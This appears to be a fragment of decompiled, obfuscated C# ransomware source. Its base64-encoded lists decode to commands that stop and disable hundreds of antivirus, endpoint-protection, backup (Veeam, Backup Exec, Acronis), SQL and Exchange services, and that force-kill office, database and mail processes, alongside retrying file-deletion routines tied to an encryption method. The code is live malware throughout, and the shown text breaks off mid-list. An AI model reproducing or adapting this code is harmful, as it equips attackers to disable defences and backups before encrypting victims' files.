		public void _003CEncrypt2_003Eb__46()
		{
			while (true)
			{
				try
				{
					File.Delete(UZavYxvKDEAva);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__47()
		{
			while (true)
			{
				try
				{
					if (File.Exists(vxjqxeajvIhW))
					{
						File.Delete(vxjqxeajvIhW);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string plsJGHfMIwqB = "EVET";

	public static byte[] vzfvEbaMMJjzL = null;

	public static string ZrRHitKveMxniC = "NO";

	public static string FIbXXLCVARq = "100000000";

	public static List<string> nMCOBGfKnYn = new List<string>();

	public static List<string> nWvlGzDAqqn = new List<string>();

	public static string PZtctlGFWSPg = "NO";

	public static string FYndIeNOJJCR = "";

	public static string nFHjUKNuaEOj = "";

	public static string LbwMCCprGBEIfG = "NO";

	public static int kqWotmnIUhMss = 0;

	public static string NvrJrGCLFM = "YES";

	public static string qUnWPmXugZmhz = "NO";

	public static string ubsfdUxyfp = "NO";

	public static string DmygpjMfFmdLKl = "0";

	public static string eaZoKQQqQZielZ = "YES";

	public static string syfdPqgiPJltW = "NO";

	public static string QwQuntCagGTAD = "YES";

	public static string mEzYTStgRnr = "NO";

	public static List<string> HDBJOODGwwozS = new List<string>
	{
		oMKRHTBqYRfOk("bHNhc3MuZXhl"),
		oMKRHTBqYRfOk("c3ZjaHN0LmV4ZQ=="),
		oMKRHTBqYRfOk("Y3Jjc3MuZXhl"),
		oMKRHTBqYRfOk("Y2hyb21lMzIuZXhl"),
		oMKRHTBqYRfOk("ZmlyZWZveC5leGU="),
		oMKRHTBqYRfOk("Y2FsYy5leGU="),
		oMKRHTBqYRfOk("bXlzcWxkLmV4ZQ=="),
		oMKRHTBqYRfOk("ZGxsaHN0LmV4ZQ=="),
		oMKRHTBqYRfOk("b3BlcmEzMi5leGU="),
		oMKRHTBqYRfOk("bWVtb3AuZXhl"),
		oMKRHTBqYRfOk("c3Bvb2xjdi5leGU="),
		oMKRHTBqYRfOk("Y3RmbW9tLmV4ZQ=="),
		oMKRHTBqYRfOk("U2t5cGVBcHAuZXhl")
	};

	public static List<string> igfzwruhwWDXY = new List<string>();

	public static string kdbxgjgptILmf = "YES";

	public static string naEJQRwrPwowmubCfC = "NO";

	public static string EojNkoLUVXxT = "NO";

	public static List<string> TZzJBVGXhjZB = new List<string>();

	public static string jwPpkVDbeOk = "NO";

	private static string qygfGaCSBKuMaYS = "068a8f70-35fc-4d9e-bcf1-5b97f5f4affb";

	public static string dQHMXFnCEYNSw = "YES";

	public static string MEfeXGAJzJqj = "NO";

	public static List<string> yYvMwQIIRucF = new List<string>
	{
		oMKRHTBqYRfOk("c3RhcnQgRG5zY2FjaGUgL3k="),
		oMKRHTBqYRfOk("c3RhcnQgRkRSZXNQdWIgL3k="),
		oMKRHTBqYRfOk("c3RhcnQgU1NEUFNSViAveQ=="),
		oMKRHTBqYRfOk("c3RhcnQgdXBucGhvc3QgL3k="),
		oMKRHTBqYRfOk("c3RvcCBhdnBzdXMgL3k="),
		oMKRHTBqYRfOk("c3RvcCBNY0FmZWVETFBBZ2VudFNlcnZpY2UgL3k="),
		oMKRHTBqYRfOk("c3RvcCBtZmV3YyAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBCTVIgQm9vdCBTZXJ2aWNlIC95"),
		oMKRHTBqYRfOk("c3RvcCBOZXRCYWNrdXAgQk1SIE1URlRQIFNlcnZpY2UgL3k="),
		oMKRHTBqYRfOk("c3RvcCBEZWZXYXRjaCAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBjY0V2dE1nciAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBjY1NldE1nciAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBTYXZSb2FtIC95"),
		oMKRHTBqYRfOk("c3RvcCBSVFZzY2FuIC95"),
		oMKRHTBqYRfOk("c3RvcCBRQkZDU2VydmljZSAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBRQklEUFNlcnZpY2UgL3k="),
		oMKRHTBqYRfOk("c3RvcCBJbnR1aXQuUXVpY2tCb29rcy5GQ1MgL3k="),
		oMKRHTBqYRfOk("c3RvcCBRQkNGTW9uaXRvclNlcnZpY2UgL3k="),
		oMKRHTBqYRfOk("c3RvcCBZb29CYWNrdXAgL3k="),
		oMKRHTBqYRfOk("c3RvcCBZb29JVCAveQ=="),
		oMKRHTBqYRfOk("c3RvcCB6aHVkb25nZmFuZ3l1IC95"),
		oMKRHTBqYRfOk("c3RvcCBzdGNfcmF3X2FnZW50IC95"),
		oMKRHTBqYRfOk("c3RvcCBWU05BUFZTUyAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBWZWVhbVRyYW5zcG9ydFN2YyAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBWZWVhbURlcGxveW1lbnRTZXJ2aWNlIC95"),
		oMKRHTBqYRfOk("c3RvcCBWZWVhbU5GU1N2YyAveQ=="),
		oMKRHTBqYRfOk("c3RvcCB2ZWVhbSAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBQRFZGU1NlcnZpY2UgL3k="),
		oMKRHTBqYRfOk("c3RvcCBCYWNrdXBFeGVjVlNTUHJvdmlkZXIgL3k="),
		oMKRHTBqYRfOk("c3RvcCBCYWNrdXBFeGVjQWdlbnRBY2NlbGVyYXRvciAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBCYWNrdXBFeGVjQWdlbnRCcm93c2VyIC95"),
		oMKRHTBqYRfOk("c3RvcCBCYWNrdXBFeGVjRGl2ZWNpTWVkaWFTZXJ2aWNlIC95"),
		oMKRHTBqYRfOk("c3RvcCBCYWNrdXBFeGVjSm9iRW5naW5lIC95"),
		oMKRHTBqYRfOk("c3RvcCBCYWNrdXBFeGVjTWFuYWdlbWVudFNlcnZpY2UgL3k="),
		oMKRHTBqYRfOk("c3RvcCBCYWNrdXBFeGVjUlBDU2VydmljZSAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBBY3JTY2gyU3ZjIC95"),
		oMKRHTBqYRfOk("c3RvcCBBY3JvbmlzQWdlbnQgL3k="),
		oMKRHTBqYRfOk("c3RvcCBDQVNBRDJEV2ViU3ZjIC95"),
		oMKRHTBqYRfOk("c3RvcCBDQUFSQ1VwZGF0ZVN2YyAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBzb3Bob3MgL3k="),
		oMKRHTBqYRfOk("c3RvcCDigJxBY3JvbmlzIFZTUyBQcm92aWRlcuKAnSAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBNc0R0c1NlcnZlciAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBJSVNBZG1pbiAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBNU0V4Y2hhbmdlRVMgL3k="),
		oMKRHTBqYRfOk("c3RvcCDigJxTb3Bob3MgQWdlbnTigJ0gL3k="),
		oMKRHTBqYRfOk("c3RvcCBFcmFzZXJTdmMxMTcxMCAveQ=="),
		oMKRHTBqYRfOk("c3RvcCDigJxFbnRlcnByaXNlIENsaWVudCBTZXJ2aWNl4oCdIC95"),
		oMKRHTBqYRfOk("c3RvcCDigJxTUUwgQmFja3VwcyAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBNc0R0c1NlcnZlcjEwMCAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBOZXRNc21xQWN0aXZhdG9yIC95"),
		oMKRHTBqYRfOk("c3RvcCBNU0V4Y2hhbmdlSVMgL3k="),
		oMKRHTBqYRfOk("c3RvcCDigJxTb3Bob3MgQXV0b1VwZGF0ZSBTZXJ2aWNl4oCdIC95"),
		oMKRHTBqYRfOk("c3RvcCBTYW1TcyAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBSZXBvcnRTZXJ2ZXIgL3k="),
		oMKRHTBqYRfOk("c3RvcCDigJxTUUxzYWZlIEJhY2t1cCBTZXJ2aWNl4oCdIC95"),
		oMKRHTBqYRfOk("c3RvcCBNc0R0c1NlcnZlcjExMCAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBQT1AzU3ZjIC95"),
		oMKRHTBqYRfOk("c3RvcCBNU0V4Y2hhbmdlTUdNVCAveQ=="),
		oMKRHTBqYRfOk("c3RvcCDigJxTb3Bob3MgQ2xlYW4gU2VydmljZeKAnSAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBTTVRQU3ZjIC95"),
		oMKRHTBqYRfOk("c3RvcCBSZXBvcnRTZXJ2ZXIkU1FMXzIwMDggL3k="),
		oMKRHTBqYRfOk("c3RvcCDigJxTUUxzYWZlIEZpbHRlciBTZXJ2aWNl4oCdIC95"),
		oMKRHTBqYRfOk("c3RvcCBtc2Z0ZXNxbCRQUk9EIC95"),
		oMKRHTBqYRfOk("c3RvcCBTc3RwU3ZjIC95"),
		oMKRHTBqYRfOk("c3RvcCBNU0V4Y2hhbmdlTVRBIC95"),
		oMKRHTBqYRfOk("c3RvcCDigJxTb3Bob3MgRGV2aWNlIENvbnRyb2wgU2VydmljZeKAnSAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBSZXBvcnRTZXJ2ZXIkU1lTVEVNX0JHQyAveQ=="),
		oMKRHTBqYRfOk("c3RvcCDigJxTeW1hbnRlYyBTeXN0ZW0gUmVjb3ZlcnnigJ0gL3k="),
		oMKRHTBqYRfOk("c3RvcCBNU09MQVAkU1FMXzIwMDggL3k="),
		oMKRHTBqYRfOk("c3RvcCBVSTBEZXRlY3QgL3k="),
		oMKRHTBqYRfOk("c3RvcCBNU0V4Y2hhbmdlU0EgL3k="),
		oMKRHTBqYRfOk("c3RvcCDigJxTb3Bob3MgRmlsZSBTY2FubmVyIFNlcnZpY2XigJ0gL3k="),
		oMKRHTBqYRfOk("c3RvcCBSZXBvcnRTZXJ2ZXIkVFBTIC95"),
		oMKRHTBqYRfOk("c3RvcCDigJxWZWVhbSBCYWNrdXAgQ2F0YWxvZyBEYXRhIFNlcnZpY2XigJ0gL3k="),
		oMKRHTBqYRfOk("c3RvcCBNU09MQVAkU1lTVEVNX0JHQyAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBXM1N2YyAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBNU0V4Y2hhbmdlU1JTIC95"),
		oMKRHTBqYRfOk("c3RvcCDigJxTb3Bob3MgSGVhbHRoIFNlcnZpY2XigJ0gL3k="),
		oMKRHTBqYRfOk("c3RvcCBSZXBvcnRTZXJ2ZXIkVFBTQU1BIC95"),
		oMKRHTBqYRfOk("c3RvcCDigJxab29seiAyIFNlcnZpY2XigJ0gL3k="),
		oMKRHTBqYRfOk("c3RvcCBNU09MQVAkVFBTIC95"),
		oMKRHTBqYRfOk("c3RvcCDigJxhcGhpZG1vbml0b3JzZXJ2aWNl4oCdIC95"),
		oMKRHTBqYRfOk("c3RvcCBtc2V4Y2hhbmdlYWR0b3BvbG9neSAveQ=="),
		oMKRHTBqYRfOk("c3RvcCDigJxTb3Bob3MgTUNTIEFnZW504oCdIC95"),
		oMKRHTBqYRfOk("c3RvcCBBY3JTY2gyU3ZjIC95"),
		oMKRHTBqYRfOk("c3RvcCBNU09MQVAkVFBTQU1BIC95"),
		oMKRHTBqYRfOk("c3RvcCDigJxpbnRlbChyKSBwcm9zZXQgbW9uaXRvcmluZyBzZXJ2aWNl4oCdIC95"),
		oMKRHTBqYRfOk("c3RvcCBtc2V4Y2hhbmdlaW1hcDQgL3k="),
		oMKRHTBqYRfOk("c3RvcCDigJxTb3Bob3MgTUNTIENsaWVudOKAnSAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBBUlNNIC95"),
		oMKRHTBqYRfOk("c3RvcCBNU1NRTCRCS1VQRVhFQyAveQ=="),
		oMKRHTBqYRfOk("c3RvcCB1bmlzdG9yZXN2Y18xYWY0MGEgL3k="),
		oMKRHTBqYRfOk("c3RvcCDigJxTb3Bob3MgTWVzc2FnZSBSb3V0ZXLigJ0gL3k="),
		oMKRHTBqYRfOk("c3RvcCBCYWNrdXBFeGVjQWdlbnRBY2NlbGVyYXRvciAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBNU1NRTCRFQ1dEQjIgL3k="),
		oMKRHTBqYRfOk("c3RvcCBhdWRpb2VuZHBvaW50YnVpbGRlciAveQ=="),
		oMKRHTBqYRfOk("c3RvcCDigJxTb3Bob3MgU2FmZXN0b3JlIFNlcnZpY2XigJ0gL3k="),
		oMKRHTBqYRfOk("c3RvcCBCYWNrdXBFeGVjQWdlbnRCcm93c2VyIC95"),
		oMKRHTBqYRfOk("c3RvcCBNU1NRTCRQUkFDVElDRU1HVCAveQ=="),
		oMKRHTBqYRfOk("c3RvcCDigJxTb3Bob3MgU3lzdGVtIFByb3RlY3Rpb24gU2VydmljZeKAnSAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBCYWNrdXBFeGVjRGV2aWNlTWVkaWFTZXJ2aWNlIC95"),
		oMKRHTBqYRfOk("c3RvcCBNU1NRTCRQUkFDVFRJQ0VCR0MgL3k="),
		oMKRHTBqYRfOk("c3RvcCDigJxTb3Bob3MgV2ViIENvbnRyb2wgU2VydmljZeKAnSAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBCYWNrdXBFeGVjSm9iRW5naW5lIC95"),
		oMKRHTBqYRfOk("c3RvcCBNU1NRTCRQUk9EIC95"),
		oMKRHTBqYRfOk("c3RvcCBBY3JvbmlzQWdlbnQgL3k="),
		oMKRHTBqYRfOk("c3RvcCBCYWNrdXBFeGVjTWFuYWdlbWVudFNlcnZpY2UgL3k="),
		oMKRHTBqYRfOk("c3RvcCBNU1NRTCRQUk9GWEVOR0FHRU1FTlQgL3k="),
		oMKRHTBqYRfOk("c3RvcCBBbnRpdmlydXMgL3k="),
		oMKRHTBqYRfOk("c3RvcCBCYWNrdXBFeGVjUlBDU2VydmljZSAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBNU1NRTCRTQlNNT05JVE9SSU5HIC8="),
		oMKRHTBqYRfOk("c3RvcCBNU1NRTCRTQlNNT05JVE9SSU5HIC95"),
		oMKRHTBqYRfOk("c3RvcCBBVlAgL3k="),
		oMKRHTBqYRfOk("c3RvcCBCYWNrdXBFeGVjVlNTUHJvdmlkZXIgL3k="),
		oMKRHTBqYRfOk("c3RvcCBNU1NRTCRTSEFSRVBPSU5UIC95"),
		oMKRHTBqYRfOk("c3RvcCBEQ0FnZW50IC95"),
		oMKRHTBqYRfOk("c3RvcCBiZWRiZyAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBNU1NRTCRTUUxfMjAwOCAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBFaHR0cFNydiAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBNTVMgL3k="),
		oMKRHTBqYRfOk("c3RvcCBNU1NRTCRTUUxFWFBSRVNTIC95"),
		oMKRHTBqYRfOk("c3RvcCBla3JuIC95"),
		oMKRHTBqYRfOk("c3RvcCBtb3p5cHJvYmFja3VwIC95"),
		oMKRHTBqYRfOk("c3RvcCBNU1NRTCRTWVNURU1fQkdDIC95"),
		oMKRHTBqYRfOk("c3RvcCBFUFNlY3VyaXR5U2VydmljZSAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBNU1NRTCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBNU1NRTCRUUFMgL3k="),
		oMKRHTBqYRfOk("c3RvcCBFUFVwZGF0ZVNlcnZpY2UgL3k="),
		oMKRHTBqYRfOk("c3RvcCBudHJ0c2NhbiAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBNU1NRTCRUUFNBTUEgL3k="),
		oMKRHTBqYRfOk("c3RvcCBFc2dTaEtlcm5lbCAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBQRFZGU1NlcnZpY2UgL3k="),
		oMKRHTBqYRfOk("c3RvcCBNU1NRTCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBFU0hBU1JWIC95"),
		oMKRHTBqYRfOk("c3RvcCBTRFJTVkMgL3k="),
		oMKRHTBqYRfOk("c3RvcCBNU1NRTCRWRUVBTVNRTDIwMTIgL3k="),
		oMKRHTBqYRfOk("c3RvcCBGQV9TY2hlZHVsZXIgL3k="),
		oMKRHTBqYRfOk("c3RvcCBTUUxBZ2VudCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBNU1NRTEZETGF1bmNoZXIkUFJPRlhFTkdBR0VNRU5UIC95"),
		oMKRHTBqYRfOk("c3RvcCBLQVZGUyAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBTUUxXcml0ZXIgL3k="),
		oMKRHTBqYRfOk("c3RvcCBNU1NRTEZETGF1bmNoZXIkU0JTTU9OSVRPUklORyAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBLQVZGU0dUIC95"),
		oMKRHTBqYRfOk("c3RvcCBWZWVhbUJhY2t1cFN2YyAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBNU1NRTEZETGF1bmNoZXIkU0hBUkVQT0lOVCAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBrYXZmc3NscCAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBWZWVhbUJyb2tlclN2YyAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBNU1NRTEZETGF1bmNoZXIkU1FMXzIwMDggL3k="),
		oMKRHTBqYRfOk("c3RvcCBrbG5hZ2VudCAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBWZWVhbUNhdGFsb2dTdmMgL3k="),
		oMKRHTBqYRfOk("c3RvcCBNU1NRTEZETGF1bmNoZXIkU1lTVEVNX0JHQyAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBtYWNtbnN2YyAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBWZWVhbUNsb3VkU3ZjIC95"),
		oMKRHTBqYRfOk("c3RvcCBNU1NRTEZETGF1bmNoZXIkVFBTIC95"),
		oMKRHTBqYRfOk("c3RvcCBtYXN2YyAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBWZWVhbURlcGxveW1lbnRTZXJ2aWNlIC95"),
		oMKRHTBqYRfOk("c3RvcCBNU1NRTEZETGF1bmNoZXIkVFBTQU1BIC95"),
		oMKRHTBqYRfOk("c3RvcCBNQkFNU2VydmljZSAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBWZWVhbURlcGxveVN2YyAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBNU1NRTFNFUlZFUiAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBNQkVuZHBvaW50QWdlbnQgL3k="),
		oMKRHTBqYRfOk("c3RvcCBWZWVhbUVudGVycHJpc2VNYW5hZ2VyU3ZjIC95"),
		oMKRHTBqYRfOk("c3RvcCBNU1NRTFNlcnZlckFESGVscGVyIC95"),
		oMKRHTBqYRfOk("c3RvcCBNY0FmZWVFbmdpbmVTZXJ2aWNlIC95"),
		oMKRHTBqYRfOk("c3RvcCBWZWVhbUh2SW50ZWdyYXRpb25TdmMgL3k="),
		oMKRHTBqYRfOk("c3RvcCBNU1NRTFNlcnZlckFESGVscGVyMTAwIC95"),
		oMKRHTBqYRfOk("c3RvcCBNY0FmZWVGcmFtZXdvcmsgL3k="),
		oMKRHTBqYRfOk("c3RvcCBWZWVhbU1vdW50U3ZjIC95"),
		oMKRHTBqYRfOk("c3RvcCBNU1NRTFNlcnZlck9MQVBTZXJ2aWNlIC95"),
		oMKRHTBqYRfOk("c3RvcCBNY0FmZWVGcmFtZXdvcmtNY0FmZWVGcmFtZXdvcmsgL3k="),
		oMKRHTBqYRfOk("c3RvcCBWZWVhbU5GU1N2YyAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBNeVNRTDU3IC95"),
		oMKRHTBqYRfOk("c3RvcCBNY1NoaWVsZCAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBWZWVhbVJFU1RTdmMgL3k="),
		oMKRHTBqYRfOk("c3RvcCBNeVNRTDgwIC95"),
		oMKRHTBqYRfOk("c3RvcCBNY1Rhc2tNYW5hZ2VyIC95"),
		oMKRHTBqYRfOk("c3RvcCBWZWVhbVRyYW5zcG9ydFN2YyAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBPcmFjbGVDbGllbnRDYWNoZTgwIC95"),
		oMKRHTBqYRfOk("c3RvcCBtZmVmaXJlIC95"),
		oMKRHTBqYRfOk("c3RvcCB3YmVuZ2luZSAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBSZXBvcnRTZXJ2ZXIkU1FMXzIwMDggL3k="),
		oMKRHTBqYRfOk("c3RvcCBtZmVtbXMgL3k="),
		oMKRHTBqYRfOk("c3RvcCB3YmVuZ2luZSAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBSRVN2YyAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBtZmV2dHAgL3k="),
		oMKRHTBqYRfOk("c3RvcCBzbXNfc2l0ZV9zcWxfYmFja3VwIC95"),
		oMKRHTBqYRfOk("c3RvcCBTUUxBZ2VudCRCS1VQRVhFQyAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBNU1NRTCRTT1BIT1MgL3k="),
		oMKRHTBqYRfOk("c3RvcCBTUUxBZ2VudCRDSVRSSVhfTUVUQUZSQU1FIC95"),
		oMKRHTBqYRfOk("c3RvcCBzYWNzdnIgL3k="),
		oMKRHTBqYRfOk("c3RvcCBTUUxBZ2VudCRDWERCIC95"),
		oMKRHTBqYRfOk("c3RvcCBTQVZBZG1pblNlcnZpY2UgL3k="),
		oMKRHTBqYRfOk("c3RvcCBTUUxBZ2VudCRFQ1dEQjIgL3k="),
		oMKRHTBqYRfOk("c3RvcCBTQVZTZXJ2aWNlIC95"),
		oMKRHTBqYRfOk("c3RvcCBTUUxBZ2VudCRQUkFDVFRJQ0VCR0MgL3k="),
		oMKRHTBqYRfOk("c3RvcCBTZXBNYXN0ZXJTZXJ2aWNlIC95"),
		oMKRHTBqYRfOk("c3RvcCBTUUxBZ2VudCRQUkFDVFRJQ0VNR1QgL3k="),
		oMKRHTBqYRfOk("c3RvcCBTaE1vbml0b3IgL3k="),
		oMKRHTBqYRfOk("c3RvcCBTUUxBZ2VudCRQUk9EIC95"),
		oMKRHTBqYRfOk("c3RvcCBTbWNpbnN0IC95"),
		oMKRHTBqYRfOk("c3RvcCBTUUxBZ2VudCRQUk9GWEVOR0FHRU1FTlQgL3k="),
		oMKRHTBqYRfOk("c3RvcCBTbWNTZXJ2aWNlIC95"),
		oMKRHTBqYRfOk("c3RvcCBTUUxBZ2VudCRTQlNNT05JVE9SSU5HIC95"),
		oMKRHTBqYRfOk("c3RvcCBTbnRwU2VydmljZSAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBTUUxBZ2VudCRTSEFSRVBPSU5UIC95"),
		oMKRHTBqYRfOk("c3RvcCBzb3Bob3NzcHMgL3k="),
		oMKRHTBqYRfOk("c3RvcCBTUUxBZ2VudCRTUUxfMjAwOCAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBTUUxBZ2VudCRTT1BIT1MgL3k="),
		oMKRHTBqYRfOk("c3RvcCBTUUxBZ2VudCRTUUxFWFBSRVNTIC95"),
		oMKRHTBqYRfOk("c3RvcCBzdmNHZW5lcmljSG9zdCAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBTUUxBZ2VudCRTWVNURU1fQkdDIC95"),
		oMKRHTBqYRfOk("c3RvcCBzd2lfZmlsdGVyIC95"),
		oMKRHTBqYRfOk("c3RvcCBTUUxBZ2VudCRUUFMgL3k="),
		oMKRHTBqYRfOk("c3RvcCBzd2lfc2VydmljZSAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBTUUxBZ2VudCRUUFNBTUEgL3k="),
		oMKRHTBqYRfOk("c3RvcCBzd2lfdXBkYXRlIC95"),
		oMKRHTBqYRfOk("c3RvcCBTUUxBZ2VudCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBzd2lfdXBkYXRlXzY0IC95"),
		oMKRHTBqYRfOk("c3RvcCBTUUxBZ2VudCRWRUVBTVNRTDIwMTIgL3k="),
		oMKRHTBqYRfOk("c3RvcCBUbUNDU0YgL3k="),
		oMKRHTBqYRfOk("c3RvcCBTUUxCcm93c2VyIC95"),
		oMKRHTBqYRfOk("c3RvcCB0bWxpc3RlbiAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBTUUxTYWZlT0xSU2VydmljZSAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBUcnVlS2V5IC95"),
		oMKRHTBqYRfOk("c3RvcCBTUUxTRVJWRVJBR0VOVCAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBUcnVlS2V5U2NoZWR1bGVyIC95"),
		oMKRHTBqYRfOk("c3RvcCBTUUxURUxFTUVUUlkgL3k="),
		oMKRHTBqYRfOk("c3RvcCBUcnVlS2V5U2VydmljZUhlbHBlciAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBTUUxURUxFTUVUUlkkRUNXREIyIC95"),
		oMKRHTBqYRfOk("c3RvcCBXUlNWQyAveQ=="),
		oMKRHTBqYRfOk("c3RvcCBtc3NxbCR2aW1fc3FsZXhwIC95"),
		oMKRHTBqYRfOk("c3RvcCB2YXBpZW5kcG9pbnQgL3k=")
	};

	public static List<string> lsWtVCsEzBTL = new List<string>
	{
		oMKRHTBqYRfOk("Y29uZmlnIERuc2NhY2hlIHN0YXJ0PSBhdXRv"),
		oMKRHTBqYRfOk("Y29uZmlnIEZEUmVzUHViIHN0YXJ0PSBhdXRv"),
		oMKRHTBqYRfOk("Y29uZmlnIFNTRFBTUlYgc3RhcnQ9IGF1dG8="),
		oMKRHTBqYRfOk("Y29uZmlnIHVwbnBob3N0IHN0YXJ0PSBhdXRv"),
		oMKRHTBqYRfOk("Y29uZmlnIFNRTFRFTEVNRVRSWSBzdGFydD0gZGlzYWJsZWQ="),
		oMKRHTBqYRfOk("Y29uZmlnIFNRTFRFTEVNRVRSWSRFQ1dEQjIgc3RhcnQ9IGRpc2FibGVk"),
		oMKRHTBqYRfOk("Y29uZmlnIFNRTFdyaXRlciBzdGFydD0gZGlzYWJsZWQ="),
		oMKRHTBqYRfOk("Y29uZmlnIFNzdHBTdmMgc3RhcnQ9IGRpc2FibGVk")
	};

	public static List<string> vptJpYJhZlMRM = new List<string>
	{
		oMKRHTBqYRfOk("L0lNIG1zcHViLmV4ZSAvRg=="),
		oMKRHTBqYRfOk("L0lNIG15ZGVza3RvcHFvcy5leGUgL0Y="),
		oMKRHTBqYRfOk("L0lNIG15ZGVza3RvcHNlcnZpY2UuZXhlIC9G"),
		oMKRHTBqYRfOk("L0lNIG15c3FsZC5leGUgL0Y="),
		oMKRHTBqYRfOk("L0lNIHNxYmNvcmVzZXJ2aWNlLmV4ZSAvRg=="),
		oMKRHTBqYRfOk("L0lNIGZpcmVmb3hjb25maWcuZXhlIC9G"),
		oMKRHTBqYRfOk("L0lNIGFnbnRzdmMuZXhlIC9G"),
		oMKRHTBqYRfOk("L0lNIHRoZWJhdC5leGUgL0Y="),
		oMKRHTBqYRfOk("L0lNIHN0ZWFtLmV4ZSAvRg=="),
		oMKRHTBqYRfOk("L0lNIGVuY3N2Yy5leGUgL0Y="),
		oMKRHTBqYRfOk("L0lNIGV4Y2VsLmV4ZSAvRg=="),
		oMKRHTBqYRfOk("L0lNIENOVEFvU01nci5leGUgL0Y="),
		oMKRHTBqYRfOk("L0lNIHNxbHdyaXRlci5leGUgL0Y="),
		oMKRHTBqYRfOk("L0lNIHRiaXJkY29uZmlnLmV4ZSAvRg=="),
		oMKRHTBqYRfOk("L0lNIGRiZW5nNTAuZXhlIC9G"),
		oMKRHTBqYRfOk("L0lNIHRoZWJhdDY0LmV4ZSAvRg=="),
		oMKRHTBqYRfOk("L0lNIG9jb21tLmV4ZSAvRg=="),
		oMKRHTBqYRfOk("L0lNIGluZm9wYXRoLmV4ZSAvRg=="),
		oMKRHTBqYRfOk("L0lNIG1iYW10cmF5LmV4ZSAvRg=="),
		oMKRHTBqYRfOk("L0lNIHpvb2x6LmV4ZSAvRg=="),
		oMKRHTBqYRfOk("SU0gdGh1bmRlcmJpcmQuZXhlIC9G"),
		oMKRHTBqYRfOk("L0lNIGRic25tcC5leGUgL0Y="),
		oMKRHTBqYRfOk("L0lNIHhmc3N2Y2Nvbi5leGUgL0Y="),
		oMKRHTBqYRfOk("L0lNIG1zcHViLmV4ZSAvRg=="),
		oMKRHTBqYRfOk("L0lNIE50cnRzY2FuLmV4ZSAvRg=="),
		oMKRHTBqYRfOk("L0lNIGlzcWxwbHVzc3ZjLmV4ZSAvRg=="),
		oMKRHTBqYRfOk("L0lNIG9uZW5vdGUuZXhlIC9G"),
		oMKRHTBqYRfOk("L0lNIFBjY05UTW9uLmV4ZSAvRg=="),
		oMKRHTBqYRfOk("L0lNIG1zYWNjZXNzLmV4ZSAvRg=="),
		oMKRHTBqYRfOk("L0lNIG91dGxvb2suZXhlIC9G"),
		oMKRHTBqYRfOk("L0lNIHRtbGlzdGVuLmV4ZSAvRg=="),
		oMKRHTBqYRfOk("L0lNIG1zZnRlc3FsLmV4ZSAvRg=="),
		oMKRHTBqYRfOk("L0lNIHBvd2VycG50LmV4ZSAvRg=="),
		oMKRHTBqYRfOk("L0lNIG15ZGVza3RvcHFvcy5leGUgL0Y="),
		oMKRHTBqYRfOk("L0lNIHZpc2lvLmV4ZSAvRg=="),
		oMKRHTBqYRfOk("L0lNIG15ZGVza3RvcHNlcnZpY2UuZXhlIC9G"),
		oMKRHTBqYRfOk("L0lNIHdpbndvcmQuZXhlIC9G"),
